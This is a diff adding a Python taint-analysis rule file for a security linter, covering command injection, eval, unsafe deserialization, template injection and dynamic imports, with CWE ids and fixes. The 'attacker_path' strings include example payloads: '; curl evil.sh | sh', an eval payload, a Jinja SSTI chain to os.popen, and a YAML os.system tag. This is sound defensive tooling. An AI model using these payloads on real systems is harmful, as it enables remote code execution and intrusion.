@@ -1,0 +1,107 @@
+# Python rules are matched on the AST. Call names are resolved through import aliases,
+# so `from os import system as s; s(x)` still matches `os.system`.
+#
+# Rule fields:
+#   match:            fully qualified call names
+#   arg:              index of the argument that carries the payload (default 0)
+#   when_kwarg_true:  only fire when this keyword is literally True (e.g. shell=True)
+#   safe_kwarg:       keyword whose listed values make the call safe (e.g. yaml Loader)
+#   attacker_path:    one-line exploit path; {source} and {sink} are filled from taint results
+language: python
+linter: ast
+extensions: [".py"]
+
+sources:
+  attributes: [request.args, request.form, request.values, request.json, request.data,
+               request.cookies, request.headers, request.files, request.GET, request.POST,
+               request.body, request.query_params, sys.argv, os.environ]
+  calls: [input, os.getenv, os.environ.get, request.get_json, request.args.get,
+          request.form.get, request.values.get, request.GET.get, request.POST.get,
+          request.headers.get, request.cookies.get, sys.stdin.read, sys.stdin.readline]
+  file_reads: [open, pathlib.Path.read_text, pathlib.Path.read_bytes]
+  route_decorators: [route, get, post, put, patch, delete, api_view, websocket]
+
+# Calls whose result is no longer attacker-shaped for the sinks above.
+sanitizers: [shlex.quote, int, float, bool, len, ast.literal_eval, uuid.UUID, hashlib.sha256]
+
+rules:
+  - id: py-os-system
+    title: Shell command built from data
+    cwe: CWE-78
+    severity: high
+    match: [os.system, os.popen, os.popen2, os.popen3, commands.getoutput, commands.getstatusoutput]
+    attacker_path: "Attacker controls {source}, which reaches {sink} and runs as a shell command, so `; curl evil.sh | sh` gives code execution."
+    fix: "Use subprocess.run([...], shell=False) with a list of arguments and validate input against an allowlist."
+
+  - id: py-subprocess-shell
+    title: subprocess with shell=True
+    cwe: CWE-78
+    severity: high
+    match: [subprocess.run, subprocess.call, subprocess.Popen, subprocess.check_output,
+            subprocess.check_call, subprocess.getoutput, subprocess.getstatusoutput]
+    when_kwarg_true: shell
+    attacker_path: "Attacker controls {source}, which is passed to {sink} with shell=True, so shell metacharacters run arbitrary commands."
+    fix: "Drop shell=True and pass an argument list; never interpolate input into a command string."
+
+  - id: py-os-exec
+    title: Process spawn with data-controlled program
+    cwe: CWE-78
+    severity: medium
+    match: [os.execl, os.execle, os.execlp, os.execv, os.execve, os.execvp, os.spawnl,
+            os.spawnv, os.spawnve, os.spawnlp, os.startfile]
+    attacker_path: "Attacker controls {source}, which selects the program {sink} executes."
+    fix: "Map input to a fixed allowlist of programs; never pass input as the executable path."
+
+  - id: py-eval
+    title: eval/exec of data
+    cwe: CWE-95
+    severity: high
+    match: [eval, exec, compile, builtins.eval, builtins.exec]
+    attacker_path: "Attacker controls {source}, which {sink} runs as Python code, so `__import__('os').system('id')` executes."
+    fix: "Use ast.literal_eval for literals or a dedicated parser; never eval input."
+
+  - id: py-pickle
+    title: Unsafe deserialization
+    cwe: CWE-502
+    severity: high
+    match: [pickle.loads, pickle.load, cPickle.loads, cPickle.load, dill.loads, dill.load,
+            marshal.loads, shelve.open, jsonpickle.decode, joblib.load, pandas.read_pickle]
+    attacker_path: "Attacker supplies bytes in {source}; {sink} rebuilds objects and calls __reduce__, which runs any callable."
+    fix: "Use json or a schema-validated format; if pickle is required, sign payloads with HMAC and verify first."
+
+  - id: py-torch-load
+    title: torch.load without weights_only
+    cwe: CWE-502
+    severity: medium
+    match: [torch.load]
+    safe_kwarg: { weights_only: ["True"] }
+    attacker_path: "Attacker supplies a model file via {source}; {sink} unpickles it and runs embedded code."
+    fix: "Pass weights_only=True or use safetensors."
+
+  - id: py-yaml-load
+    title: yaml.load with an unsafe loader
+    cwe: CWE-502
+    severity: high
+    match: [yaml.load, yaml.load_all, yaml.full_load, yaml.full_load_all, yaml.unsafe_load,
+            yaml.unsafe_load_all]
+    safe_kwarg: { Loader: [SafeLoader, CSafeLoader, yaml.SafeLoader, yaml.CSafeLoader, BaseLoader, yaml.BaseLoader] }
+    attacker_path: "Attacker supplies YAML in {source}; {sink} builds `!!python/object/apply:os.system` tags into live calls."
+    fix: "Use yaml.safe_load(...)."
+
+  - id: py-ssti-jinja
+    title: Template rendered from data (SSTI)
+    cwe: CWE-1336
+    severity: high
+    match: [flask.render_template_string, jinja2.Template, jinja2.Environment.from_string,
+            mako.template.Template, django.template.Template]
+    method_names: [from_string]   # env.from_string(...) on any Environment instance
+    attacker_path: "Attacker controls the template text in {source}; {sink} compiles it, so `{{ cycler.__init__.__globals__.os.popen('id').read() }}` executes."
+    fix: "Render fixed template files and pass input only as context variables."
+
+  - id: py-dynamic-import
+    title: Import of a data-controlled module
+    cwe: CWE-94
+    severity: medium
+    match: [importlib.import_module, __import__]
+    attacker_path: "Attacker controls the module name in {source}; {sink} imports and runs it."
+    fix: "Map input to an allowlist of module names."
